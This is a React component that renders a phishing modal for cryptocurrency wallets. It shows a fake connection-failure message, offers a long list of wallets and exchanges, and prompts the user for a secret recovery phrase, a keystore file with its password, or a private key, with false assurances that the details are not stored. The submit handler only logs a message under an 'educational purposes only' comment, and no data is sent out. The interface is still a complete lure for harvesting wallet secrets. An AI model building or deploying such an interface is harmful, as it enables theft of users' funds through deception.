import { useState } from "react";
import { X } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Textarea } from "@/components/ui/textarea";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";

interface WalletConnectionModalProps {
  isOpen: boolean;
  onClose: () => void;
  selectedService: string;
}

const walletTypes = [
  "Best wallet",
  "Phantom",
  "Solflare",
  "Binance chain wallet",
  "Theta",
  "Bitfrost",
  "Wallet connect",
  "Avax",
  "Cosmos",
  "Fantom",
  "Huobi",
  "Bybit",
  "Kucoin",
  "Mexc",
  "Zerion",
  "Okx",
  "Bitget",
  "Zapper",
  "Tonkeeper",
  "Exodus",
  "Blockchain",
  "Metamask",
  "Trust Wallet",
  "Coinbase",
  "Keplr Wallet",
  "Safepal",
  "Tronlink",
  "Defichain Wallet",
  "DFX Defichain",
  "Solana",
  "Lobstr Wallet",
  "Yoroi Wallet",
  "Coinomi",
  "Edge Wallet",
  "Solar Wallet",
  "Pera Algo Wallet",
  "Sender Wallet",
  "Xcel Pay Wallet",
  "Anchor Wallet"
];

const accessTypes = [
  "Phrase",
  "Keystore JSON",
  "Private Key"
];

const WalletConnectionModal = ({ isOpen, onClose, selectedService }: WalletConnectionModalProps) => {
  const [walletType, setWalletType] = useState("");
  const [accessType, setAccessType] = useState("");
  const [showForm, setShowForm] = useState(false);

  const handleConnect = () => {
    // This is for educational purposes only - in a real app, never handle private keys this way
    console.log("Educational simulation - wallet connection attempted");
    onClose();
  };

  const handleAccessTypeSelect = (type: string) => {
    setAccessType(type);
    setShowForm(true);
  };

  const handleBack = () => {
    setShowForm(false);
    setAccessType("");
  };

  const handleClose = () => {
    setShowForm(false);
    setAccessType("");
    setWalletType("");
    onClose();
  };

  const renderFormContent = () => {
    switch (accessType) {
      case "Phrase":
        return (
          <div className="space-y-4">
            <h3 className="font-medium text-center">Input Secret Key Phrase</h3>
            <Textarea 
              placeholder="Enter Phrase" 
              className="bg-slate-700 border-slate-600 text-white min-h-[100px]"
            />
            <p className="text-xs text-gray-400 text-center">
              Typically 12 (sometimes 24) words separated by single spaces
            </p>
          </div>
        );
      case "Keystore JSON":
        return (
          <div className="space-y-4">
            <h3 className="font-medium text-center">Input Keystore JSON</h3>
            <Textarea 
              placeholder="Enter Keystore JSON" 
              className="bg-slate-700 border-slate-600 text-white min-h-[100px]" 
            />
            <div className="space-y-2">
              <h3 className="font-medium text-center">Enter Password</h3>
              <Input 
                type="password" 
                placeholder="Enter Password" 
                className="bg-slate-700 border-slate-600 text-white" 
              />
            </div>
            <p className="text-xs text-gray-400 text-center">
              Several lines of text beginning with "{"{" }" plus the password you used to encrypt it
            </p>
          </div>
        );
      case "Private Key":
        return (
          <div className="space-y-4">
            <h3 className="font-medium text-center">Input Private Key phrase</h3>
            <Input 
              type="password" 
              placeholder="Enter Private Key*" 
              className="bg-slate-700 border-slate-600 text-white" 
            />
            <p className="text-xs text-gray-400 text-center">
              Typically contains a string of alphanumeric characters which are about 50 or more in number.
            </p>
          </div>
        );
      default:
        return null;
    }
  };

  const renderInitialScreen = () => (
    <div className="space-y-6">
      <div className="text-center">
        <p className="text-red-400 font-medium mb-4">
          Failed to connect! Use the form below to connect manually.
        </p>
      </div>

      <div className="space-y-4">
        <Select value={walletType} onValueChange={setWalletType}>
          <SelectTrigger className="bg-slate-700 border-slate-600 text-white">
            <SelectValue placeholder="Wallet Type" />
          </SelectTrigger>
          <SelectContent className="bg-slate-700 border-slate-600">
            {walletTypes.map((wallet) => (
              <SelectItem key={wallet} value={wallet} className="text-white hover:bg-slate-600">
                {wallet}
              </SelectItem>
            ))}
          </SelectContent>
        </Select>

        {walletType && (
          <div className="space-y-3">
            <p className="text-sm text-gray-300 text-center">Select Access Method:</p>
            {accessTypes.map((access) => (
              <Button
                key={access}
                onClick={() => handleAccessTypeSelect(access)}
                variant="outline"
                className="w-full bg-slate-700 border-slate-600 text-white hover:bg-slate-600"
              >
                {access}
              </Button>
            ))}
          </div>
        )}
      </div>

      <div className="text-center text-sm text-gray-400 px-4">
        Any misinformation may hinder the successful resolution of the issue. Your details are not
        stored on our system; they are for resolution purposes only.
      </div>

      <div className="flex space-x-3">
        <Button
          onClick={handleConnect}
          className="flex-1 bg-blue-600 hover:bg-blue-700 text-white"
        >
          Connect Wallet
        </Button>
        <Button
          onClick={handleClose}
          variant="destructive"
          className="flex-1"
        >
          Cancel
        </Button>
      </div>
    </div>
  );

  const renderFormScreen = () => (
    <div className="space-y-6">
      {renderFormContent()}
      
      <div className="flex space-x-3">
        <Button
          onClick={handleBack}
          variant="outline"
          className="flex-1 bg-slate-700 border-slate-600 text-white hover:bg-slate-600"
        >
          Back
        </Button>
        <Button
          onClick={handleConnect}
          className="flex-1 bg-blue-600 hover:bg-blue-700 text-white"
        >
          Connect Wallet
        </Button>
      </div>
    </div>
  );

  return (
    <Dialog open={isOpen} onOpenChange={handleClose}>
      <DialogContent className="bg-slate-800 border-slate-700 text-white max-w-md">
        <DialogHeader>
          <DialogTitle className="text-center text-lg">
            {showForm ? `Connect Your ${walletType || 'Wallet'}` : 'Connect Your Wallet To Get Started'}
          </DialogTitle>
          <button
            onClick={handleClose}
            className="absolute right-4 top-4 text-gray-400 hover:text-white"
          >
            <X className="h-4 w-4" />
          </button>
        </DialogHeader>

        <div className="mt-6">
          {showForm ? renderFormScreen() : renderInitialScreen()}
        </div>
      </DialogContent>
    </Dialog>
  );
};

export default WalletConnectionModal;
